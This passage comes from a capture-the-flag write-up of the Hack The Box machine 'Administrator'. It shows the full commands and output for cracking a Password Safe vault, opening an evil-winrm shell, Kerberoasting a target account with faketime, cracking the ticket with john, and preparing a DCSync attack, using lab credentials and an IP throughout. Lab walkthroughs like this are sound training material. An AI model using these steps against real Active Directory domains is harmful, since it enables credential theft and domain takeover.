+226 Transfer complete.</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f780f18092f6cba51252f2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s a database file used by </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://pwsafe.org/">Password Safe</a></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780359d95ef04fdf18572" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> file Backup.psafe3   
+
+Backup.psafe3: Password Safe V3 database</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f780ec9ab9fd22260bdbef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Its content are encrypted, but I discovered from a Google search that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hashcat</code></span><span class="SemanticString"> has a module for it:</span></span></p></div><div id="https://www.notion.so/1770b98a88f7800a923feca698ec4f76" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7ee9f0ea-5c2e-4859-a0c0-f19a59179c15%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-800a-923f-eca698ec4f76"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7ee9f0ea-5c2e-4859-a0c0-f19a59179c15%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-800a-923f-eca698ec4f76" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780a989f9ed2e1805b9aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The file can be thrown directly at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hashcat</code></span><span class="SemanticString"> without further formatting, and the master password is cracked to be </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">tekieromucho</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780cda53dc68314d4be87" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> hashcat -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt -m 5200
+
+hashcat (v6.2.6) starting
+
+..SNIP..
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>Backup.psafe3:tekieromucho</span></mark></span><span class="SemanticString"><span>                                
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5200 (Password Safe v3)
+Hash.Target......: Backup.psafe3
+Time.Started.....: Wed Jan  8 13:21:54 2025 (1 sec)
+Time.Estimated...: Wed Jan  8 13:21:55 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    18359 H/s (5.69ms) @ Accel:512 Loops:128 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 8192/14344385 (0.06%)
+Rejected.........: 0/8192 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -&gt; whitetiger
+
+Started: Wed Jan  8 13:21:24 2025
+Stopped: Wed Jan  8 13:21:57 2025</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f780ddb5e4c7af1397aeb1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On my Windows host, I installed Password Safe and opened the database using the cracked master password. It contains credentials for 3 users: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">alexander</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">emma</code></span><span class="SemanticString">, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">emily</code></span><span class="SemanticString">. Unfortunately Password Safe prevents screenshots, so I’m unable to provide any images here.</span></span></p></div><div id="https://www.notion.so/1770b98a88f7803d9e8cd78a697c37ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I went back to BloodHound to check the three accounts. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">alexander</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">emma</code></span><span class="SemanticString"> are both disabled accounts, but </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">emily</code></span><span class="SemanticString"> is active, and can be used to log in to WinRM.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780859efce188f1b86837" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -u emily -p &#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27; -i administrator.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\emily\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+administrator\emily</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f78063b6aee6b6f943a04c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f780eea52cf4b2efbc0fa7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1770b98a88f780c3a4ccde5e0c8169bf" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\emily\desktop&gt;</span></mark></span><span class="SemanticString"><span> type user.txt
+
+35690287************************</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f780c68d67e2e2360f353e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f78014b0e2fac1e6f9b7f6" class="Divider"></div><h3 id="https://www.notion.so/1770b98a88f7803686efd0ab2238e96c" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1770b98a88f7803686efd0ab2238e96c"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">emily</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1770b98a88f78016b28ee0bd3b0dd048" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">BloodHound Path Finding:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f780e4a1d9c91bf45adb77" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With a new user under control, I’ll once again query BloodHound to see what nodes it can get to. First thing I noticed is that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">emily</code></span><span class="SemanticString"> can reach 10 high value targets, which likely include the domain administrator.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780f88f2dc551138abffe" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F59d83a6b-0be1-4afc-b94a-490481d8641b%2Fimage.png?width=473&amp;table=block&amp;id=1770b98a-88f7-80f8-8f2d-c551138abffe"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F59d83a6b-0be1-4afc-b94a-490481d8641b%2Fimage.png?width=473&amp;table=block&amp;id=1770b98a-88f7-80f8-8f2d-c551138abffe" style="width:473px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f7804eb93de07a3c29cb0a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Clicking on it shows an attack graph. While it looks a bit complicated, it only involves two steps. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">emily</code></span><span class="SemanticString"> has </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GenericWrite</code></span><span class="SemanticString"> rights on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ethan</code></span><span class="SemanticString">, who can perform a DCSync attack.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780378f7ac0a5dd0e944e" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Feaa9c324-0052-40b6-934e-ca1c60881ae1%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-8037-8f7a-c0a5dd0e944e"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Feaa9c324-0052-40b6-934e-ca1c60881ae1%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-8037-8f7a-c0a5dd0e944e" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780d69d11fed7d7a8eb98" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f78005a5c2c9a38086ef5a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">DACL Abuse — </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">GenericWrite</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f7809da0d9cd5d533cc72c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F4194f847-59cc-4342-946c-5de8d7826bef%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-809d-a0d9-cd5d533cc72c"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F4194f847-59cc-4342-946c-5de8d7826bef%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-809d-a0d9-cd5d533cc72c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780d3b676ea24581e8c52" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Users granted </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GenericWrite</code></span><span class="SemanticString"> rights on an object have the ability to modify most of its attributes including its </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">servicePrincipalName</code></span><span class="SemanticString"> (SPN). An </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names">SPN</a></span><span class="SemanticString"> is a unique identifier of a service instance within Active Directory, enabling clients to request a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.thehacker.recipes/ad/movement/kerberos/#tickets">Service Ticket</a></span><span class="SemanticString"> (ST) from the KDC for that service. Users can also be assigned SPNs, and if attackers gain control over it, they can leverage it to launch targeted Kerberoasting attacks.</span></span></p></div><div id="https://www.notion.so/1770b98a88f78072b35dff0a9b563f3e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f780ff8faff758df976c6f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Targeted Kerberoasting:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f780a3b303dda8e2e578b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When requesting a Service Ticket, the requesting user needs to provide a valid TGT and the SPN of the desired service. If both are valid, the KDC returns an ST that’s encrypted with the service account’s password hash. The ticket can then be cracked offline to recover the service account’s password, and this is the core concept of a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast">Kerberoasting attack</a></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1770b98a88f78079a74acda5c9036d12" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">An ST can only be requested for accounts with SPN registered, and a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://trustmarque.com/resources/what-is-targeted-keberoasting/">Targeted Kerberoasting</a></span><span class="SemanticString"> would first use rights such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GenericWrite</code></span><span class="SemanticString"> to assign the target an SPN before continuing with the standard Kerberoasting attack. This is normally required when targeting normal user accounts, as they typically don’t have an SPN registered.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780e3ae9cc6e13f0c2ba7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.hackingarticles.in/abusing-ad-dacl-genericwrite/">This post</a></span><span class="SemanticString"> provides several attack examples, one of which uses </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast.py</a></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1770b98a88f7809fb746cc6d83728ef0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> python targetedKerberoast.py --dc-ip &#x27;10.129.85.158&#x27; -v -d &#x27;administrator.htb&#x27; -u &#x27;emily&#x27; -p &#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27; --request-user ethan 
+
+[*] Starting kerberoast attacks
+[*] Attacking user (ethan)
+[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+Traceback (most recent call last):
+  File &quot;/home/chengw/Desktop/hack/htb/machines/administrator/post-exploitation/targetedKerberoast.py&quot;, line 597, in main
+    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,
+                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py&quot;, line 323, in getKerberosTGT
+    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py&quot;, line 93, in sendReceive
+    raise krbError
+impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f780a7b56eefe39adcd69e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It failed due to the time difference between the server and my host, but I can forge a system time using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">faketime</code></span><span class="SemanticString">. This would be handy in an Active Directory test, as may AD attacks rely on accurate time synchronization.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780a8b99bd742e6736502" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> faketime &quot;$(ntpdate -q administrator.htb | cut -d &#x27; &#x27; -f 1,2)&quot; python targetedKerberoast.py --dc-ip &#x27;10.129.85.158&#x27; -v -d &#x27;administrator.htb&#x27; -u &#x27;emily&#x27; -p &#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27; --request-user ethan
+
+[*] Starting kerberoast attacks
+[*] Attacking user (ethan)
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$26adae90be67e6f5b69fcb457c1c211d$00e0200def2f8ef5db0787b54e37aaba55c1dd5d9914e476f987b8ac89e09c0d81d579d7ab2876663076d57e37fe139f55430a45441d93533721282e5d5c25e46ba620517dc57c8282dbaf7fd780e1164717695009d5e77ba62eb20f476a292f2f6cc9cc9bfcf5dced5509d7679ccb912f127b9ecfc8a072d6d564c2d9d1bcfc0a76421479b66e9e235eef53f28cb87f02ecbe9fe41822521a8e5128964587437647a09723bad429f2e91157d20f602a649ae4984bf0e025a0d4ddea30b1098a373732faddd6e649a9a040cf688d3ffd7de34099036d4586bb341b07405734b288adcbf572592a8edb8402657c486fbba1f903811978d47b176b8f44dd15661aaece8e203169c3ecb71aaff4b5f77b38b70f809fbe678b983a0fd21afae2a15a889ab0a14bfb5f7fc5f9c6349f9eec0b7a4a62c0914c5a3a8a0cde9d8b111659d90723af2fb1812f03546b02907adbf6cfa617c177103afa3ea44225d19c325f1d8c95232974833fec8b3dc4be1c1156573d99a0110d3962b0c59bfde842faebb75d1ebe6d908feaa33309413f90435137f4d33f010d5c8d2f7edea66a9333c1161459ad292f62930926f0b683b52c13b89b7b5f2bb76b58d1c0f877c05c1ff3ebd6c2b0d7d45e349afd0622ec7511853fb985ec70f1fbf6d08d63ca00fce371aafced9cdac0edbe2d335ae6e399566e5fef55d9a4059ffd697202dc084a0db1d681e74dabbe110c512d40af100e839a2e3203e0fc13212cdc66e94c1cfe5e36b0ffe1a1ec8fa93e2149629d713c260965c4d48cff0d06e44238aaf13bcfc04096ff74bd94fa92d6d2817507c0517b5df726a1f95de96f1477d3c3605fa543b8b09b2ccf13d2ccf77a2f250dfdd528d4472be7b00338906d11a0fd388c5be6d7f8d2229706e61c48830cc84355db39ffa13369ef1f9939b502beeff2a1639391b4bdcd73adec155fdcd69b99de00fd93cfa619856bd0cdcee7f2acad2d3c9615b2b597e2434c936ebae44243dafb590fe42c52e3490cec851149400630e2eeea124c04a909bcbcfdddbe3286aafb22b68382d579ddd4bac18667449333a2839ca89fd4f915ba0112d037b90c1cc91d32fd07ee803e3adbea6d65a802b2bb84cf25a3d4390ead26781e0c8ee6d47e38f0bdcad5e3771bca89c37586de3d9216692f0c9d81655d3275b3111d1ae21e40496320c44db140089cf9c5b3626fd63d8961e353e5257edfddf61a8a239d2034087fd4ddb6e2fc9af6756ef5837e775d7948c66b5ed2b2fe4ffd0538b4df4566bf61bcc844015411a9d1f7f645cdbde4514c7ff3c564d2194d8e9472d16ae9ae2534e43168262bd62063df5a96155d0f9c65d1792b7891f9171ffb9df9a37ef1237403c796fbc661b05e4a6b0e8f0eb4da91e8da25259daa6c3b7537106d97570751207f9ad3f1f943d91e34280d70b0a4ae9711b54b8a34b54e7db479f0eab00a190d98ae7b2c1c8aae6ba5bcca2f8a71bddfb03040869dfcb56fa99a50e9f9f032daffe351abeaa668b6fcb1b2d2bc</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7800088c4c677a37b7009" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This time the attack was successful, and the Service Ticket for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ethan</code></span><span class="SemanticString"> was obtained.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780e7b24ad1d89d33ec53" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$26adae90be67e6f5b69fcb457c1c211d$00e0200def2f8ef5db0787b54e37aaba55c1dd5d9914e476f987b8ac89e09c0d81d579d7ab2876663076d57e37fe139f55430a45441d93533721282e5d5c25e46ba620517dc57c8282dbaf7fd780e1164717695009d5e77ba62eb20f476a292f2f6cc9cc9bfcf5dced5509d7679ccb912f127b9ecfc8a072d6d564c2d9d1bcfc0a76421479b66e9e235eef53f28cb87f02ecbe9fe41822521a8e5128964587437647a09723bad429f2e91157d
+..SNIP..</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f780ddb974e4d612f21dfa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString"> cracked the password almost immediately:</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780d68cc8cf997ccd5dc5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=/usr/share/wordlists/rockyou.txt ethan.hash 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>limpbizkit       </span></mark></span><span class="SemanticString"><span>(?)     
+1g 0:00:00:00 DONE (2025-01-08 16:03) 20.00g/s 163840p/s 163840c/s 163840C/s newzealand..whitetiger
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7805c9a5fd9af742b5e45" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ethan</code></span><span class="SemanticString"> cannot log in to WinRM, but I can once again use SMB to confirm the password works.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780e6b4fcd87ea330b2b2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb 10.129.85.158 -u &#x27;ethan&#x27; -p &#x27;limpbizkit&#x27;         
+
+SMB         10.129.85.158   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.129.85.158   445    DC               </span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>[+] administrator.htb\ethan:limpbizkit</span></mark></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7801f9b74c9bf566c838c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f7807f9462e118d77c17da" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">DCSync:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f7803f8dc6d8ca4587df71" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe326e864-1869-4a8b-93a3-39ab61d7ca56%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-803f-8dc6-d8ca4587df71"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe326e864-1869-4a8b-93a3-39ab61d7ca56%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-803f-8dc6-d8ca4587df71" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f7802dbcefd831bdc97682" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In an enterprise AD environment, there are often multiple domain controllers for redundancy purposes. The </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0">Directory Replication Service</a></span><span class="SemanticString"> (DRS) Remote Protocol provides an API to allow synchronization between DCs. When receiving an update request, the domain controller only validates the requester’s SID and if it has the required privileges, but does not check if the request originates from a legitimate DC. This loophole opens the door for DCSync attacks, where an attacker impersonates a remote domain controller to requests updates to sensitive objects and steal credentials.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780e29a58d41f64db6c99" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The attack requires the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GetChanges</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GetChangesAll</code></span><span class="SemanticString"> privileges, both of which are granted to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ethan</code></span><span class="SemanticString">. I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">impacket-secretsdump</code></span><span class="SemanticString"> to extract the administrator password hash:</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780aba162e2c625ab1952" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark 